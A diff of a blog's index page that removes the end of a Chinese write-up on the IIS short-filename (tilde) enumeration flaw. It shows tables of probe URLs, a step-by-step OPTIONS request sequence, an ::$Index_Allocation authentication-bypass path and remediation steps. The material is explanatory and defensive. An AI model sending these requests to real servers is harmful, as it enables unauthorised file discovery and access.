-<td><a target="_blank" rel="noopener" href="http://dl.me/acsecr~1.%3f/.aspx">http://dl.me/acsecr~1.%3f/.aspx</a></td>
-<td>400- Invalid: Extension has more than 1 character</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="http://sdl.me/acsecr~1.%3f%3f%3f/.aspx">http://sdl.me/acsecr~1.%3f%3f%3f/.aspx</a></td>
-<td>404 - Valid: Extension has 3 or more characters</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="http://sdl.me/acsecr~1.a%3f%3f/.aspx">http://sdl.me/acsecr~1.a%3f%3f/.aspx</a></td>
-<td>400 - Invalid: Extension does not start with“A”</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="http://sdl.me/acsecr~1.h%3f%3f/.aspx">http://sdl.me/acsecr~1.h%3f%3f/.aspx</a></td>
-<td>404 - Valid: Extension starts with“H”</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="http://sdl.me/acsecr~1.htm/.aspx">http://sdl.me/acsecr~1.htm/.aspx</a></td>
-<td>404 - Valid: Extension starts with“HTM”</td>
-</tr>
-</tbody></table>
-<p>但是千里目实验室在真实环境验证发现，在IIS高版本（如：IIS 8.0&#x2F;IIS 8.5&#x2F;IIS 10.0），即使没有安装asp.net，通过 <code>OPTIONS</code> 和 <code>TRACE</code> 方法也可以猜解成功。这两种方法猜解返回的HTTP状态码类型和上述表格内容表有些许出入，但是不失为另一种利用方式。</p>
-<p><strong>IIS 10.0 短文件猜解过程分析</strong></p>
-<table>
-<thead>
-<tr>
-<th>序号</th>
-<th>原始扫描包URL解码</th>
-<th>HTTP状态码</th>
-<th>状态码含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td>OPTIONS &#x2F;*~1*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
-<td>404</td>
-<td>猜测成功，存在短文件漏洞</td>
-</tr>
-<tr>
-<td>2</td>
-<td>OPTIONS &#x2F;?*~1*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
-<td>404</td>
-<td>猜测成功，存在1个及以上字母开头的文件</td>
-</tr>
-<tr>
-<td>3</td>
-<td>OPTIONS &#x2F;*T*~1*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
-<td>404</td>
-<td>猜测成功，文件名中包含字母T</td>
-</tr>
-<tr>
-<td>4</td>
-<td>OPTIONS &#x2F;*~1.*T*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
-<td>404</td>
-<td>猜测成功，文件后综名包含字母T</td>
-</tr>
-<tr>
-<td>5</td>
-<td>OPTIONS &#x2F;*S*~1*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
-<td>404</td>
-<td>猜测成功，文件名中包含字母S</td>
-</tr>
-<tr>
-<td>6</td>
-<td>OPTIONS &#x2F;*~1.*H*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
-<td>404</td>
-<td>猜测成功，文件后缀名包含字母H</td>
-</tr>
-<tr>
-<td>7</td>
-<td>OPTIONS &#x2F;*~1.*M*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
-<td>404</td>
-<td>猜测成功，文件后缀名包含字母M</td>
-</tr>
-<tr>
-<td>8</td>
-<td>OPTIONS &#x2F;*0*~1*\a.aspx?aspxerrorpath</td>
-<td>404</td>
-<td>猜测成功，文件名中包含数字0</td>
-</tr>
-<tr>
-<td>9</td>
-<td>OPTIONS &#x2F;*1*~1*\a.aspx?aspxerrorpath</td>
-<td>404</td>
-<td>猜测成功，文件名中包含数字1</td>
-</tr>
-<tr>
-<td>10</td>
-<td>OPTIONS &#x2F;I*~1*\a.aspx?aspxerrorpath</td>
-<td>404</td>
-<td>猜测成功，文件名中包含字母I开头文件</td>
-</tr>
-<tr>
-<td>11</td>
-<td>OPTIONS &#x2F;I?*~1*\a.aspx?aspxerrorpath</td>
-<td>404</td>
-<td>猜测成功，文件名I后面包含0个或多个字符</td>
-</tr>
-<tr>
-<td>12</td>
-<td>OPTIONS &#x2F;II*~1*\a.aspx?aspxerrorpath</td>
-<td>404</td>
-<td>猜测成功，文件名中第二个字母为I</td>
-</tr>
-<tr>
-<td>13</td>
-<td>OPTIONS &#x2F;II?*~1*\a.aspx?aspxerrorpath</td>
-<td>404</td>
-<td>猜测成功，文件名II后面包含0个或多个字符</td>
-</tr>
-<tr>
-<td>14</td>
-<td>OPTIONS &#x2F;IIS*~1*\a.aspx?aspxerrorpath</td>
-<td>404</td>
-<td>猜测成功，文件名中第三个字母为S</td>
-</tr>
-<tr>
-<td>15</td>
-<td>OPTIONS &#x2F;IIS?*~1*\a.aspx?aspxerrorpath</td>
-<td>404</td>
-<td>猜测成功，文件名IIS后面包含0个或多个字符</td>
-</tr>
-<tr>
-<td>16</td>
-<td>OPTIONS &#x2F;IIS1*~1*\a.aspx?aspxerrorpath</td>
-<td>404</td>
-<td>猜测成功，文件名中第四个字符为数字1</td>
-</tr>
-<tr>
-<td>17</td>
-<td>OPTIONS &#x2F;IIS1?*~1*\a.aspx?aspxerrorpath</td>
-<td>404</td>
-<td>猜测成功，文件名IIS1后面包含0个或多个字符</td>
-</tr>
-<tr>
-<td>18</td>
-<td>OPTIONS &#x2F;IIS10*~1*\a.aspx?aspxerrorpath</td>
-<td>404</td>
-<td>猜测成功，文件名中第五个字符为数字0</td>
-</tr>
-<tr>
-<td>19</td>
-<td>OPTIONS &#x2F;IIS10?*~1*\a.aspx?aspxerrorpath</td>
-<td>404</td>
-<td>猜测成功，文件名IIS10后面包含0个或多个字符</td>
-</tr>
-<tr>
-<td>20</td>
-<td>OPTIONS &#x2F;IIS10T*~1*\a.aspx?aspxerrorpath</td>
-<td>404</td>
-<td>猜测成功，文件名中第六个字母为T</td>
-</tr>
-<tr>
-<td>21</td>
-<td>OPTIONS &#x2F;IIS10T~1?\a.aspx?aspxerrorpath</td>
-<td>200</td>
-<td>猜测失败，不包含多个相同的短文件名</td>
-</tr>
-<tr>
-<td>22</td>
-<td>OPTIONS &#x2F;IIS10T*~2*\a.aspx?aspxerrorpath</td>
-<td>200</td>
-<td>猜测失败，不包含2个相同的短文件名</td>
-</tr>
-<tr>
-<td>23</td>
-<td>OPTIONS &#x2F;IIS10T~1.H*\a.aspx?aspxerrorpath</td>
-<td>404</td>
-<td>猜测成功，文件名未重复且后缀以开头</td>
-</tr>
-<tr>
-<td>24</td>
-<td>OPTIONS &#x2F;IIS10T~1.HT*\a.aspx?aspxerrorpath</td>
-<td>404</td>
-<td>猜测成功，文件名未重复且后缀第二字母为T</td>
-</tr>
-<tr>
-<td>25</td>
-<td>OPTIONS &#x2F;IIS10T~1.HTM\a.aspx?aspxerrorpath</td>
-<td>404</td>
-<td>猜测成功并结束，IIS10T~1.HIM被猜测出来</td>
-</tr>
-</tbody></table>
-<p><strong>TRACE方法猜解分析</strong></p>
-<p>通过TRACE方法猜解的过程基本同上，只不过此HTTP方法猜解失败返回的状态码不是200，而是501（未执行）。</p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="1-深入爆破猜测文件全名"><a href="#1-深入爆破猜测文件全名" class="headerlink" title="1. 深入爆破猜测文件全名"></a>1. 深入爆破猜测文件全名</h4><p>通过 IIS 短文件漏洞猜测出来的短文件名称，需要继续猜测出全名才可以在IIS上进行访问，即 IIS 由于安全原因不支持短文件名访问。以下是 Soroush Dalili 给出的几种猜测文件全名的方法：</p>
-<ol>
-<li>通过对目标网站或同类型网站进行爬虫，爬出建立一个字典库，再与得到的短文件名来猜剩下的字符 ；</li>
-<li>利用 <a target="_blank" rel="noopener" href="http://code.google.com/p/fuzzdb/">fuzzdb</a> (一个应用程序模糊测试(fuzzing)数据库)来猜解；</li>
-<li>结合OWASP的 <a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a> （一款路径及网页暴力破解的工具）。</li>
-</ol>
-<p>Github 上有研究人员已经用 python 将上述方法实现，并且获取到了网站后台的用户名和密码，很好的利用了 IIS 短文件漏洞。</p>
-<blockquote>
-<p>注： <br>研究报告地址：<a target="_blank" rel="noopener" href="https://webbreacher.com/2014/10/23/tilde-enumeration/">https://webbreacher.com/2014/10/23/tilde-enumeration/</a> （推荐）<br>python 程序下载：<a target="_blank" rel="noopener" href="https://github.com/WebBreacher/tilde_enum">https://github.com/WebBreacher/tilde_enum</a> （推荐）</p>
-</blockquote>
-<h4 id="2-结合支持短文件特性软件（Apache、Wordpress）"><a href="#2-结合支持短文件特性软件（Apache、Wordpress）" class="headerlink" title="2. 结合支持短文件特性软件（Apache、Wordpress）"></a>2. 结合支持短文件特性软件（Apache、Wordpress）</h4><p>Acunetix 研究指出当 Apache 运行在 windows 下，如果创建了一个长文件，那么无需猜解长文件，直接用短文件就可以下载了。例如一个 <code>backup_20180101.sql</code> 的长文件，其短文件是 <code>BACKUP~1.SQL</code>，攻击者只需要提交 <code>BACKUP~1.SQL</code> 就可以直接访问并下载该文件。</p>
-<p>此外，有学者表明，其在安装Wordpress备份插件之后，通过短文件名成功地访问到了了WordPress博客的备份文件。</p>
-<h4 id="3-绕过Basic-and-Windows认证"><a href="#3-绕过Basic-and-Windows认证" class="headerlink" title="3. 绕过Basic and Windows认证"></a>3. 绕过Basic and Windows认证</h4><p>Soroush Dalilide 研究中还提到，在某些 IIS 服务器配置下，可以绕过 Basic and Windows 认证，猜解出认证目录下的文件。举例，如果需要访问一个开启认证的目录下文件时，比如这个目录是 “AuthNeeded”，那么可以通过如下方式访问：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/AuthNeeded::$Index_Allocation/*~1*/.aspx</span><br><span class="line">或者</span><br><span class="line">/AuthNeeded:$I30:$Index_Allocation/*~1*/.aspx</span><br></pre></td></tr></table></figure>
-<h3 id="此漏洞存在以下几个局限点："><a href="#此漏洞存在以下几个局限点：" class="headerlink" title="此漏洞存在以下几个局限点："></a>此漏洞存在以下几个局限点：</h3><ol>
-<li>此漏洞只能确定前6个字符，如果后面的字符太长、包含特殊字符，很难猜解；</li>
-<li>如果文件名本身太短（无短文件名）也是无法猜解的；</li>
-<li>如果文件名前6位带空格，8.3格式的短文件名会补进，和真实文件名不匹配；</li>
-<li>如果文件夹名前6位字符带点“.”，扫描程序会认为是文件而不是文件夹，最终出现误报；</li>
-<li>不支持中文文件名，包括中文文件和中文文件夹。一个中文相当于两个英文字符，故超过4个中文字会产生短文件名，但是IIS不支持中文猜测。</li>
-</ol>
-<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><h4 id="通用漏洞修复方案"><a href="#通用漏洞修复方案" class="headerlink" title="通用漏洞修复方案"></a>通用漏洞修复方案</h4><p><strong>1. CMD关闭NTFS 8.3文件格式的支持</strong><br>举例：（1代表关闭，0代表开启）<br>Windows Server 2008 R2：<br>查询是否开启短文件名功能：fsutil 8dot3name query<br>关闭该功能：fsutil 8dot3name set 1<br>Windows Server 2003：<br>关闭该功能：fsutil behavior set disable8dot3 1<br>不同系统关闭命令稍有区别，该功能默认是开启的，对于大多数用户来说无需开启。</p>
-<p><strong>2. 修改注册表禁用短文件名功能</strong><br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem，将其中的 NtfsDisable8dot3NameCreation 这一项的值设为 1，1代表不创建短文件名格式<br>修改完成后，需要重启系统生效</p>
-<blockquote>
-<p>注：此方法只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除，需要重新复制才会消失。</p>
-</blockquote>
-<p><em>以下两种方法仅适用于缓解GET 方法，其他方法依旧可以猜解。</em><br><strong>3. 关闭Web服务扩展- ASP.NET</strong><br><strong>4. 升级netFramework至4.0以上版本</strong></p>
-<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04-参考"></a>0x04-参考</h2><p>备份文件在特定环境下（apache）可被任意下载（利用windows短文件名）：<a target="_blank" rel="noopener" href="http://www.jinglingshu.org/?p=6039%5C">http://www.jinglingshu.org/?p=6039\</a><br>IIS短文件名漏洞知识：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/172561.html">https://www.freebuf.com/articles/web/172561.html</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -2147,18 +1895,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-count">21</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
-        <span class="site-state-item-count">33</span>
+        <span class="site-state-item-count">35</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
